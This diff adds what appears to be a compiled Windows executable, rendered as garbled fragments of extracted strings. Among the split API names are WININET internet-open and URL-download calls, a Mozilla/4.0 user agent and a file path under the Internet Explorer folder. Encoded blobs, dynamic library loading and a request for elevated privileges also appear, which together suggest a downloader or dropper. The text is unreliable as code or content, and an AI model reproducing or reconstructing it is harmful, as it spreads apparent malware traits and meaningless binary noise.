@@ -1,0 +1,415 @@
+!This program cannot be run in DOS mode.
+Richw
+.text
+`.rdata
+@.data
+.rsrc
+@.reloc
+KERN
+EL32
+.dll
+Heap
+Free
+KERN
+EL32
+.dll
+Virt
+ualA
+lloc
+KERN
+EL32f
+Virtf
+Free
+PWRQ
+KERN
+EL32
+.dll
+Free
+Libr
+KERN
+EL32f
+Virtf
+Free
+KERN
+EL32f
+Heap
+Free
+ttVW
+KERN
+EL32
+.dll
+Virt
+ualA
+lloc
+C4RP
++C4t
+v	_[3
+KERN
+EL32f
+GetF
+eSizf
+KERN
+EL32f
+Virtf
+updaf
+KERN
+EL32
+.dll
+GetF
+ileS
+RVSW
+tIj2j
+WINI
+NET.
+Inte
+rnet
+Openf
+Mozi
+lla/
+4.0 
+(com
+pati
+ble)
+nUrlf
+adFi
+tClo
+Hand
+C:\P
+rogr
+am F
+iles
+\Int
+erne
+t Ex
+plorf
+\upd
+ata.
+SSSS
+SSVIf
+2018
+-SV1
+woVW
+hxn@
+YQPVh
+h\q@
+oV f
+o^0f
+of@f
+onPf
+ov`f
+o~pf
+FGIu
+X^_]
+FGIu
+htq@
+hdq@
+h,q@
+uTVWh
+5lp@
+hL{@
+PPPPP
+<v*V
+^SSSSS
+5lp@
+=hp@
+8csm
+t$<"u	3
+t?VSP
+Y[_^
+PPPPP
+>"u&
+< tK<	tG
+wf93t
+f90u
+f90u
+VVV+
+@PSVV
+t*VV
+j@j ^V
+SWf9M
+j@j 
+hl|@
+Whl|@
+5hp@
+=lp@
+Y__^[
+9csm
+PPPPP
+h)K@
+t!Ht
+_^[]
+Y_^[
+Y_^[
+5hp@
+5lp@
+_^[]
+t'Ou
+t&:a
+u,9E
+_^[]
+to= 
+Y_^[]
+Fpt"
+URPQQh a@
+L$,3
+UVWS
+[_^]
+SVWj
+_^[]
+9]$u
+9](SS
+t"SS9] u
+9] SS
+v4;5T
+vL;5l
+SVWUj
+]_^[
+h k@
+;t$,v-
+UQPXY]Y[
+v	N+D$
+PPPPPPPP
+PPPPPPPP
+bad allocation
+CorExitProcess
+Unknown exception
+FlsFree
+FlsSetValue
+FlsGetValue
+FlsAlloc
+GetProcessWindowStation
+GetUserObjectInformationW
+GetLastActivePopup
+GetActiveWindow
+MessageBoxW
+HH:mm:ss
+dddd, MMMM dd, yyyy
+MM/dd/yy
+December
+November
+October
+September
+August
+July
+June
+April
+March
+February
+January
+Saturday
+Friday
+Thursday
+Wednesday
+Tuesday
+Monday
+Sunday
+ Complete Object Locator'
+ Class Hierarchy Descriptor'
+ Base Class Array'
+ Base Class Descriptor at (
+ Type Descriptor'
+`local static thread guard'
+`managed vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`vector copy constructor iterator'
+`dynamic atexit destructor for '
+`dynamic initializer for '
+`eh vector vbase copy constructor iterator'
+`eh vector copy constructor iterator'
+`managed vector destructor iterator'
+`managed vector constructor iterator'
+`placement delete[] closure'
+`placement delete closure'
+`omni callsig'
+ delete[]
+ new[]
+`local vftable constructor closure'
+`local vftable'
+`RTTI
+`udt returning'
+`copy constructor closure'
+`eh vector vbase constructor iterator'
+`eh vector destructor iterator'
+`eh vector constructor iterator'
+`virtual displacement map'
+`vector vbase constructor iterator'
+`vector destructor iterator'
+`vector constructor iterator'
+`scalar deleting destructor'
+`default constructor closure'
+`vector deleting destructor'
+`vbase destructor'
+`string'
+`local static guard'
+`typeof'
+`vcall'
+`vbtable'
+`vftable'
+operator
+ delete
+ new
+__unaligned
+__restrict
+__ptr64
+__eabi
+__clrcall
+__fastcall
+__thiscall
+__stdcall
+__pascal
+__cdecl
+__based(
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+Sleep
+GetProcessHeap
+GetProcAddress
+LoadLibraryA
+HeapAlloc
+HeapReAlloc
+VirtualProtect
+IsBadReadPtr
+lstrcpyA
+CloseHandle
+ReadFile
+CreateFileA
+FreeLibrary
+WriteFile
+DeleteFileA
+GetFileAttributesA
+KERNEL32.dll
+GetLastError
+GetCommandLineA
+HeapSetInformation
+GetStartupInfoW
+TerminateProcess
+GetCurrentProcess
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsDebuggerPresent
+IsProcessorFeaturePresent
+EncodePointer
+DecodePointer
+HeapCreate
+HeapFree
+GetModuleHandleW
+ExitProcess
+GetStdHandle
+GetModuleFileNameW
+RaiseException
+GetModuleFileNameA
+FreeEnvironmentStringsW
+WideCharToMultiByte
+GetEnvironmentStringsW
+SetHandleCount
+InitializeCriticalSectionAndSpinCount
+GetFileType
+DeleteCriticalSection
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+InterlockedIncrement
+SetLastError
+GetCurrentThreadId
+InterlockedDecrement
+QueryPerformanceCounter
+GetTickCount
+GetCurrentProcessId
+GetSystemTimeAsFileTime
+LeaveCriticalSection
+EnterCriticalSection
+LoadLibraryW
+HeapSize
+GetCPInfo
+GetACP
+GetOEMCP
+IsValidCodePage
+RtlUnwind
+LCMapStringW
+MultiByteToWideChar
+GetStringTypeW
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+sbC9sbCyva6ns72urqaf
+sa+utJ8=
+9/Pz76m8vLGwvbGwsr2up7O9rq6mqaevpqa88u8D/vP+vQP+858=
+4KnLz/H8BPH++r/l9vsC8MvW/fMC8f0C87/i5+/7/PEC8Z8=
+8wLw870C5wKf
+.?AVbad_alloc@std@@
+.?AVexception@std@@
+.?AVtype_info@@
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="highestAvailable" uiAccess="false"></requestedExecutionLevel>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>PADPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD
+0*111<1s1z1
+222w3
+4:4~4
+<J=|=
+>\>i>
+?T?[?
+*0q0
+6?6]6d6h6l6p6t6x6|6
+6B7M7h7o7t7x7|7
+8f8l8p8t8x8
+9	:8:>:M:
+; ;0;:;@;T;l;
+;?<D<N<
+=#=)=/=6===D=K=R=Y=`=h=p=x=
+0$060C0I0o0{0
+0o1w1
+2'2/2?2E2V2
+3 484B4]4e4k4y4
+7E8x8
+8":/:8:{:
+;";3;>;
+="=(=
+=*>6>P>v>|>
+?N?X?
+0M0p0v0
+1%1+13191E1K1X1b1h1r1
+2?2E2K2a2y2
+3<3F3~3
+4 4'4,444=4I4N4S4Y4]4c4h4n4s4
+5-5Q5n5
+6.7H7k7x7
+82999F9L9
+:(:.:7:J:n:
+;";,;c;i;n;|;
+<$<^<c<j<o<v<{<
+=X>]>o>
+0(0.080A0L0Q0Z0d0o0
+5%515n5t5
+9I9T9^9w9
+9$:7:
+</<A<\<d<l<
+=4=E=Y=
+0$0]0
+:.:@:R:d:v:
+;q;};
+<t>z>~>
+1 1$1(1@1D1H1\1`1
+:$:,:4:<:D:L:T:\:d:l:t:|:
+(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6|6
+7 7$7(7,7074787<7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7
+t0x0
+1 1$14181@1X1
+202P2\2x2
+3 3@3`3
+@7\7
+8p:t:x:|:
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0l0p0
+1 1$1(1
+2 2$2(2,2024282<2@2D2P2T2X2\2`2d2h2l2p2t2x2
